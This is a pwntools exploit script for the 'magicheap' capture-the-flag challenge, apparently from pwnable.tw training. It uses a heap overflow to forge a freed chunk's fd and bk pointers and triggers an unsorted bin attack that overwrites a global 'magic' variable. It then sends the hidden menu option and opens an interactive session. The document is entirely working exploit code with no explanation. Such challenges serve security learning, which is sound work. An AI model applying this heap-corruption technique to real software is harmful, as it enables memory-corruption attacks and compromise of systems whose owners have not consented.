#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "training.pwnable.tw"
port = 11014

#r = remote(host,port)
r = process('./magicheap')


def create_heap(size,content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def edit_heap(idx,size,content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def del_heap(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

create_heap(0x80,"dada") # 0
create_heap(0x20,"dada") # 1
create_heap(0x80,"dada") # 2
create_heap(0x20,"dada") # 3

del_heap(2)
del_heap(0)
magic = 0x6020c0
fd = 0
bk = magic - 0x10

edit_heap(1,0x20+0x20,"a"*0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk))
create_heap(0x80,"dada") #trigger unsorted bin attack
r.recvuntil(":")
r.sendline("4869")
r.interactive()

